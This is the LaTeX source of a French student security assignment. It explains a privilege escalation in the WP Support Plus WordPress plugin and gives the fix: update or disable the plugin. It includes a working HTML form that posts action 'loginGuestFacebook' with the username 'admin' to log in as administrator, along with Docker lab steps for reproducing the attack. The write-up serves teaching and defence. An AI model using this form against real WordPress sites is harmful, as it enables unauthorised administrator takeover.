\documentclass[a4,12pt]{article}

\usepackage{hyperref}
\usepackage[margin=2cm]{geometry}
\usepackage[francais]{babel}
\usepackage[utf8]{inputenc}
\usepackage[T1]{fontenc}
\usepackage[babel=true]{csquotes}
\usepackage{amsmath}
\usepackage{amssymb}
\usepackage{float}
\usepackage{graphicx}
\usepackage{hyperref}
\usepackage{listings}
\usepackage{color}
\setlength\parindent{20pt}
\lstset{language=python,
		commentstyle=\color{blue},
		keywordstyle=\color{red},
		emph={verify,\_find\_method\_hash},
		emphstyle=\color{green}
		}
\begin{document}
\begin{titlepage}
  \title{
    Sécurité des SI - Devoir numéro 2. \\
    Privilege escalation dans un plugin WordPress
  }
  \author{Valérian Baillet, Matthias Beaupère}
  \date{}
\end{titlepage}

\maketitle

\hspace{50px}

\section{Description de la vulnérabilité}

\subsection{WordPress et ses plugins}

WordPress est un système de gestion de contenu (aussi appelés CMS) très populaire. Il est connu parmis les CMS pour sa simplicité d'utilisation sans avoir à programmer, basé sur une très grande quantité de plugins variés.\\

Ce fonctionnement complique beaucoup le maintient de la sécurité des applications WordPress. En effet, il n'y a pas de contrôle de droits associés aux plugin. Donc même si le coeur de WordPress est sécurisé, une faille située sur un des plugin, parfois même un plugin non utilisé et donc non mis à jour, peut compromettre l'application tout entière.\\

C'est le cas ici avec le plugin WP Support Plus. Les versions 7.1.3 et antérieures possède une faille qui se répercute sur tout le site.

\subsection{L'exploit}


Pour exploiter la vulnérabilité, il faut envoyer un requ\^ete POST à l'adresse : \\
\texttt{http://mon-site.com/wp-admin/admin-ajax.php}\\

On doit fournir les données suivantes dans la requête :\\

\begin{tabular}{|c|c|}
  \hline
  Nom & Valeur \\
  \hline
  username & Login de l'admin \\
  email & sth \\
  action & loginGuestFacebook \\
  \hline
\end{tabular}\\

La valeur du champ username correspond au nom de l'utilisateur pour lequel on veut se faire passer. Idéalement, on cherche à connaitre le nom d'utilisateur de l'administrateur. 

\subsection{Explication de la vulnérabilité}

Le fichier \texttt{admin-ajax.php} appelle un script PHP du plugin WP Support Plus nommé \texttt{loginGuestFacebook.php}.

Ce script permet au plugin de connecter des utilisateurs via leur login afin qu'ils puissent envoyer des tickets de support sans se connecter directement au site. Il inscrit ces utilisateurs puis les connecte automatiquement.

Le problème dans ce script est que, bien que l'inscription ne se fait que si l'utilisateur n'est pas déjà existant, la connexion se fait dans tous les cas. On peut donc utiliser ce script pour se connecter en tant que n'importe quel utilisateur.

\section{Exemple d'architecture compromise}

Les systèmes susceptibles d'être compromis par cette vulnérabilité sont les serveurs web qui utilisent WordPress équipé du plugin WP Support Plus.

Cela peut par exemple s'implémenter avec un serveur LAMP : Une machine ubuntu munie des paquets Apache, MySql et PHP. Cette machine est accessible depuis internet. WordPress est installé sur le serveur et on y a ajouté le plugin WP Support Plus.

Un utilisateur ayant lui aussi accès à internet peut ainsi exploiter cette vulnérabilité.

Un schéma de cette configuration est donné figure \ref{archi}.

\begin{figure}[h]
  \center
  \includegraphics[width=300px]{images/vuln_wp}
  \caption{\label{archi}Exemple d'infrastructure compromise}
\end{figure}

\section{Solutions}

La meilleur solution fasse à cette faille est de mettre à jour le plugin WP Support Plus.

On peut également empêcher les attaques en désactivant le plugin WP Support Plus.

\section{Expérimentation}

Pour permettre au lecteur de réproduire l'exploitation de la vulnérabilité, nous avons mis en place le serveur LAMP avec l'installation vulnérable de WordPress sur une image Docker.

Nous avons uploader cette image en ligne gr\^ace au site DockerHub afin que chacun puisse la récupérer.

Vous devez tout d'abord installer docker. Vous pouvez faire cela sur \href{https://docker.io}{le site officiel}.\\

\subsection{Lancement du container}

Pour récupérer l'image sur notre dép\^ot DockerHub et la lancer dans un container, utilisez la commande suivante. On lie le port 8080 de votre système d'exploitation au port 80 du container afin de pouvoir accéder au serveur depuis votre système d'exploitation.

\texttt{\$ docker run -p 8080:80 -ti matthiasbe/vulnerable\_wp /bin/bash}\\

Cette commande ouvre un terminal dans le container.

\subsection{lancement du serveur}

Vous pouvez lancer les serveurs Apache et MySQL dans le container avec les commandes suivantes, à entrer l'une après l'autre dans le terminal obtenu dans l'étape précédente.

\texttt{\# service apache2 start}

\texttt{\# service mysql start}\\

Votre serveur est alors lancé. Vous pouvez y accéder en donnant l'adresse indiquée plus bas à un navigateur web sur votre machine h\^ote. Si tout s'est bien passé, vous \^etes alors sur la page d'accueil du site WordPress installé par nos soin.

Adresse du site : \texttt{http://localhost:8080/wordpress}

Un aperçu du site est donné figure \ref{apercu}

\begin{figure}[h]
  \label{apercu}
  \center
  \includegraphics[width=400px]{images/apercu.png}
  \caption{Aperçu du site WordPress}
\end{figure}

\subsection{Exploitation de la faille}

Dans le site utilisé pour l'expérimentation, le nom d'administrateur est \texttt{admin}.\\

On utilise donc le formulaire présenté figure \ref{code}.

\begin{figure}
\label{code}
\begin{lstlisting}
  <form action="http://localhost:8080/wordpress/wp-admin/admin-ajax.php"
          method="post">
      Username: <input type="text" name="username" value="admin">
      <input type="hidden" name="email" value="sth">
      <input type="hidden" name="action" value="loginGuestFacebook">
      <input type="submit" value="Login">
  </form>
\end{lstlisting}
\caption{Formulaire permettant d'exploiter la faille}
\end{figure}

Ce code est également disponible sur \href{https://github.com/matthiasbe/secuimag3a/blob/master/devoir2/docker/hack.html}{le github de notre projet}.\\

Une méthode pour l'envoyer et de copier le code dans un fichier html et d'ouvrir ce fichier avec un navigateur. On a ensuite uniquement à cliquer sur \texttt{login} pour l'envoyer.

Une fois l'envoi fait, une page blanche devrait s'afficher. Aucun affichage n'est généré mais du code PHP a été exécuté.\\

Dans un autre onglet du même navigateur, vous pouvez tenter d'accéder à l'adresse suivante :

\texttt{http://localhost:8080/wordpress/wp-admin}

Vous devez normalement être redirigé vers le panneau d'administration en tant qu'administrateur.

\section{Glossaire}

\section{Références}

\end{document}

